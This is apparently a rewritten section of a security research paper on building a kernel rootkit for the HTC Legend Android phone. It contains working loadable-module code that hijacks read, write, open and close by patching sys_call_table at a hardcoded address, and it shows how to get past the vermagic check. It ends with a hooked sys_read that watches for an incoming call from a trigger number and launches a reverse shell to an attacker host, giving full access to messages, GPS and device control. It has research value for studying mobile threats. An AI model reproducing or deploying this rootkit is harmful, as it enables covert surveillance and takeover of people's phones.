### Developing a Rootkit for the HTC Legend: Overcoming Hurdles and Achieving Success

#### 4.1 Challenges in Developing the Android Rootkit

##### 4.1.1 Retrieving the `sys_call_table` Address

Linux kernels version 2.5 and above no longer export the `sys_call_table` structure. Prior to kernel 2.5, a Loadable Kernel Module (LKM) could access the `sys_call_table` by declaring it as an external variable:

```c
extern void *sys_call_table[];
```

However, this is no longer possible. Various workarounds have been documented, including Direct Kernel Object Manipulation (DKOM). A notable example is the SuckIT rootkit, published in Phrack.

The `sys_call_table` address can also be found in the `System.map` file. Given full access to the source code, locating the `sys_call_table` is straightforward. For instance, on the Android emulator:

```bash
root@argon:~/android/kernel-common# grep sys_call_table System.map
c0021d24 T sys_call_table
```

In this case, the `sys_call_table` is located at `0xc0021d24`.

For the HTC Legend, which shipped with kernel version 2.6.29-9a3026a7, we downloaded the Linux kernel source code from the HTC Developer Center, cross-compiled it, and found the `sys_call_table` at `0xc0029fa4`:

```bash
root@argon:~/android/legend-kernel# grep sys_call_table System.map
c0029fa4 T sys_call_table
```

Since all devices ship with the same firmware/running kernel, these `sys_call_table` addresses are static across a wide range of devices, eliminating the need for additional heuristic discovery techniques.

| Environment (uname -a) | `sys_call_table` Address |
|------------------------|--------------------------|
| Android Emulator (2.6.27-00110-g132305e) | 0xc0021d24 |
| HTC Legend (2.6.29-9a3026a7) | 0xc0029fa4 |

##### 4.1.2 Compiling Against the HTC Legend Linux Kernel Source Code

The next challenge was that modules compiled against the HTC Legend kernel source code from http://developer.htc.com could not be loaded on the device due to a mismatch in the `vermagic` string. This was unexpected, as one would assume that a module compiled against the HTC Legend Linux kernel source code should load seamlessly.

This issue is illustrated below:

```bash
# insmod debug.ko
insmod: can't insert 'debug.ko': invalid module format
```

According to The Linux Documentation Project, the kernel rejects the module because the version strings (specifically, version magics) do not match. By modifying the `include/linux/utsrelease.h` file, we resolved this issue:

Before:
```c
#define UTS_RELEASE "2.6.29"
```

After:
```c
#define UTS_RELEASE "2.6.29-9a3026a7"
```

Recompiling the module with these changes allowed it to load successfully:

```bash
# insmod debug.ko
# lsmod
debug 1832 0 - Live 0xbf000000 (P)
# uname -a
Linux localhost 2.6.29-9a3026a7 #1 PREEMPT Thu Feb 25 23:36:55 CST 2010 armv6l GNU/Linux
```

With the `sys_call_table` address identified and the module loaded, the next step was to determine which system calls were responsible for various phone functions. We then hijacked these system calls, parsed their arguments, and acted on specific trigger events.

##### 4.1.3 Enabling System Call Debugging

We created a debug module to intercept the following system calls:

- `sys_write`
- `sys_read`
- `sys_open`
- `sys_close`

These system calls handle all file write, read, open, and close operations. The debug module is shown below:

```c
/* 
 * Christian Papathanasiou & Nicholas J. Percoco 
 * PI:EMAIL, PI:EMAIL 
 * (c) 2010 Trustwave  
 * 
 * Google Android rootkit debug LKM
*/

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>

asmlinkage ssize_t (*orig_read) (int fd, char *buf, size_t count);
asmlinkage ssize_t (*orig_write) (int fd, char *buf, size_t count);
asmlinkage ssize_t (*orig_open)(const char *pathname, int flags);
asmlinkage ssize_t (*orig_close) (int fd);

asmlinkage ssize_t hacked_write (int fd, char *buf, size_t count) {
    printk(KERN_INFO "SYS_WRITE: %s\n", buf);
    return orig_write(fd, buf, count);
}

asmlinkage ssize_t hacked_open(const char *pathname, int flags) {
    printk(KERN_INFO "SYS_OPEN: %s\n", pathname);
    return orig_open(pathname, flags);
}

asmlinkage ssize_t hacked_close(int fd) {
    printk(KERN_INFO "SYS_CLOSE %s\n", current->comm);
    return orig_close(fd);
}

asmlinkage ssize_t hacked_read (int fd, char *buf, size_t count) {
    printk(KERN_INFO "SYS_READ %s\n", buf);
    return orig_read(fd, buf, count);
}

static int __init root_start(void) {
    unsigned long *sys_call_table = (unsigned long *)0xc0029fa4;
    orig_read = (void *)sys_call_table[__NR_read];
    sys_call_table[__NR_read] = (unsigned long)hacked_read;
    orig_write = (void *)sys_call_table[__NR_write];
    sys_call_table[__NR_write] = (unsigned long)hacked_write;
    orig_close = (void *)sys_call_table[__NR_close];
    sys_call_table[__NR_close] = (unsigned long)hacked_close;
    orig_open = (void *)sys_call_table[__NR_open];
    sys_call_table[__NR_open] = (unsigned long)hacked_open;
    return 0;
}

static void __exit root_stop(void) {
    unsigned long *sys_call_table = (unsigned long *)0xc0029fa4;
    sys_call_table[__NR_read] = (unsigned long)orig_read;
    sys_call_table[__NR_write] = (unsigned long)orig_write;
    sys_call_table[__NR_close] = (unsigned long)orig_close;
    sys_call_table[__NR_open] = (unsigned long)orig_open;
}

module_init(root_start);
module_exit(root_stop);
```

By compiling and loading this module into the HTC Legend's running kernel, we generated system call traces with their arguments. An example trace shows the incoming call from a trigger number:

```bash
root@argon:~/android/rootkit/traces# grep 07841334111 INCOMING-CALL-TRACE
sys_read: AT+CLCC:13371585907841334111",129
```

The `AT+CLCC` command, as per ETSI standards, lists current calls and informs the call handlers of an incoming call from the specified number.

Similarly, for an outbound call, the following trace was obtained:

```bash
[ 2761.808654] sys_write: ATD+442073734841;
```

This indicates the potential to redirect outbound calls by hijacking `sys_write` and modifying the `ATD+XXXXXXX` buffer. Note that the GSM modem device is `/dev/smd0` and the GPS device is `/dev/smd27`.

At this point, we have achieved the following objectives:
1. Found the `sys_call_table` for the HTC Legend.
2. Successfully compiled our LKM against the HTC Legend source code, bypassing `vermagic` restrictions.
3. Hijacked system calls and obtained debugging information.
4. Discovered phone routines that can be hijacked.

Next, we will describe how we combined these concepts to create our rootkit.

#### 5. The Android Rootkit

##### 5.1 Hooking the `sys_read` System Call

Our rootkit, named Mindtrick, sends a reverse TCP shell over 3G/WiFi to an attacker when it receives a call from a trigger number. The attacker then has full access to the underlying operating system, allowing them to read the SQLite3 SMS/MMS databases, query the GPS subsystem, or even shut down the phone.

The rootkit hijacks the `sys_read` system call and parses the buffer for the `AT+CLCC` command. If the incoming number matches the attacker's number, it calls the `reverseshell()` function.

The hijacked `sys_read` function looks like this:

```c
asmlinkage ssize_t hacked_read (int fd, char *buf, size_t count) {
    if (strstr(buf, "CLCC")) {
        if (strstr(buf, "66666666")) { // trigger number
            reverseshell();
        }
    }
    return orig_read(fd, buf, count);
}

void reverseshell() {
    static char *path = "/data/local/shell";
    char *argv[] = {"/data/local/shell", "attacker-IP", "80", NULL};
    static char *envp[] = {"HOME=/", "PATH=/sbin:/system/sbin:/system/bin:/system/xbin", NULL};
    call_usermodehelper(path, argv, envp, 1);
}
```

The reverse shell is spawned as a child of the `keventd` kernel thread using the `call_usermodehelper` function.

---

This document provides a detailed and professional overview of the challenges faced and the solutions implemented in developing an Android rootkit for the HTC Legend.